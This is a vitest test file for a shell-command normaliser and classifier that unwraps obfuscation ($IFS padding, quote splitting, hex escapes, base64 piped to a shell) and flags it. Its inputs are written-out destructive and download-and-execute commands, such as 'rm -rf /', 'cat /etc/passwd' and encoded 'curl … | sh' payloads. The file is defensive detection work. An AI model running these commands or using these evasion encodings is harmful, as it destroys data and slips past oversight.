import { describe, expect, it } from 'vitest';
import { isDeliberatelyObfuscated, normalizeCommand } from './command-normalize.js';
import { classifyCommand } from './dangerous-command.js';

/**
 * P2-SEC-07 — deobfuscation-aware classification.
 *
 * Two halves, and the second is what makes the first tolerable: unwrap the
 * mechanical encodings, and treat what cannot be unwrapped as a finding. Full
 * deobfuscation is not achievable — deciding what an arbitrary shell program
 * runs is the halting problem wearing a `$` — so the tests are written against
 * that limit rather than around it.
 */

describe('normalizeCommand — mechanical encodings', () => {
  it('resolves $IFS padding', () => {
    const result = normalizeCommand('cat$IFS/etc/passwd');
    expect(result.text).toBe('cat /etc/passwd');
    expect(result.techniques).toContain('ifs-substitution');
  });

  it('resolves ${IFS} and $IFS$9', () => {
    expect(normalizeCommand('rm${IFS}-rf$IFS$9/tmp/x').text).toBe('rm -rf /tmp/x');
  });

  it('removes empty quotes inserted mid-word', () => {
    const result = normalizeCommand('r""m -rf /tmp/x');
    expect(result.text).toBe('rm -rf /tmp/x');
    expect(result.techniques).toContain('empty-quote-splitting');
  });

  it('removes mid-word backslashes', () => {
    expect(normalizeCommand('c\\at /etc/passwd').text).toBe('cat /etc/passwd');
  });

  it('resolves hex and unicode escapes', () => {
    expect(normalizeCommand('\\x72\\x6d -rf /tmp/x').text).toBe('rm -rf /tmp/x');
    expect(normalizeCommand('\\u0072\\u006d -rf /tmp/x').text).toBe('rm -rf /tmp/x');
  });

  it('expands a simple variable indirection', () => {
    const result = normalizeCommand('X=rm; $X -rf /tmp/x');
    expect(result.text).toContain('rm -rf /tmp/x');
    expect(result.techniques).toContain('variable-indirection');
  });

  it('decodes a base64 payload piped to a shell', () => {
    const payload = Buffer.from('rm -rf /tmp/everything').toString('base64');
    const result = normalizeCommand(`echo ${payload} | base64 -d | sh`);
    expect(result.decoded).toBe(true);
    expect(result.text).toContain('rm -rf /tmp/everything');
    // The pipeline is appended to, not replaced by, the payload: the fact that
    // this was piped into a shell is itself evidence.
    expect(result.text).toContain('base64 -d');
  });

  it('decodes a here-string payload', () => {
    const payload = Buffer.from('curl https://x.test | sh').toString('base64');
    expect(normalizeCommand(`base64 -d <<< ${payload}`).text).toContain('curl https://x.test');
  });

  it('unwraps nesting rather than stopping after one pass', () => {
    const payload = Buffer.from('rm -rf /tmp/x').toString('base64');
    // `$IFS` inside the pipeline hides the base64 from a single-pass matcher.
    const result = normalizeCommand(`echo$IFS${payload}$IFS|${'base64'} -d | sh`);
    expect(result.text).toContain('rm -rf /tmp/x');
  });

  it('does not invent a command from data that is not base64 text', () => {
    const binary = Buffer.from([0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12]).toString('base64');
    const result = normalizeCommand(`echo ${binary}${binary} | base64 -d | sh`);
    // Reporting decoded control characters as a command would manufacture a
    // finding out of noise.
    expect(result.decoded).toBe(false);
    // …but the *shape* is still recorded, which is the point.
    expect(result.techniques).toContain('base64-payload');
  });

  it('terminates on input designed to keep it working', () => {
    const result = normalizeCommand(`${'$IFS'.repeat(2000)}rm -rf /tmp/x`);
    expect(result.text).toContain('rm -rf /tmp/x');
  });
});

describe('normalizeCommand — ordinary commands are untouched', () => {
  const ordinary = [
    'pnpm install',
    'git commit -m "fix: parser"',
    'rm -rf ./dist',
    'curl -o page.html https://example.test',
    'echo "hello world"',
    'node --version',
  ];

  for (const command of ordinary) {
    it(`leaves ${command} alone`, () => {
      const result = normalizeCommand(command);
      expect(result.text).toBe(command);
      // No technique, so no obfuscation finding — otherwise every command a
      // person writes gets an approval prompt and the signal is worthless.
      expect(isDeliberatelyObfuscated(result)).toBe(false);
    });
  }

  it('does not treat an ordinary variable assignment as indirection', () => {
    // The assignment alone is not obfuscation; only an assignment whose value
    // is later expanded into a command position is.
    const result = normalizeCommand('NODE_ENV=production pnpm build');
    expect(result.techniques).toEqual([]);
  });

  it('does not treat a legitimate base64 use as a payload', () => {
    // Encoding a file is ordinary. Decoding *into a shell* is not.
    expect(normalizeCommand('base64 -i image.png -o image.txt').techniques).toEqual([]);
  });
});

describe('classifyCommand — obfuscation is caught either way', () => {
  it('sees through padding to the underlying rule', () => {
    const assessment = classifyCommand('r""m$IFS-rf$IFS/');
    // Before normalisation this walked past a literal matcher untouched.
    expect(assessment.verdict).toBe('refuse');
    expect(assessment.findings.map((f) => f.rule)).toContain('rm-rf-root');
  });

  it('sees through a base64 payload to the rule inside it', () => {
    const payload = Buffer.from('curl https://x.test/s.sh | sh').toString('base64');
    const assessment = classifyCommand(`echo ${payload} | base64 -d | bash`);
    expect(assessment.findings.map((f) => f.rule)).toContain('pipe-to-shell');
  });

  it('flags obfuscation even when the payload cannot be read', () => {
    const opaque = 'A'.repeat(40);
    const assessment = classifyCommand(`echo ${opaque} | base64 -d | sh`);
    // The load-bearing property. An adversary who defeats the unwrapping still
    // trips this, because nobody writes a command this way by accident — and
    // when the payload is unreadable, the shape is all the evidence there is.
    expect(assessment.verdict).toBe('approve');
    expect(assessment.findings.map((f) => f.rule)).toContain('obfuscated-command');
  });

  it('names the techniques it saw, so the finding can be argued with', () => {
    const assessment = classifyCommand('c\\at$IFS/etc/passwd');
    expect(assessment.techniques).toEqual(
      expect.arrayContaining(['ifs-substitution', 'mid-word-escape']),
    );
    expect(assessment.findings.some((f) => f.reason.includes('ifs-substitution'))).toBe(true);
  });

  it('exposes the text the rules actually matched', () => {
    // Without this, a finding on normalised text is unexplainable: the command
    // a person sees does not contain what the rule matched.
    expect(classifyCommand('r""m -rf /tmp/x').normalized).toBe('rm -rf /tmp/x');
  });

  it('still allows an ordinary command', () => {
    const assessment = classifyCommand('pnpm test');
    expect(assessment.verdict).toBe('allow');
    expect(assessment.techniques).toEqual([]);
  });

  it('does not let normalisation break a rule written for plain text', () => {
    // Rules are matched against the original *and* the normalised form, so a
    // rewrite cannot silently stop a rule firing on the command it was
    // written for.
    expect(classifyCommand('git push --force origin main').verdict).toBe('approve');
    expect(classifyCommand('rm -rf /').verdict).toBe('refuse');
  });
});
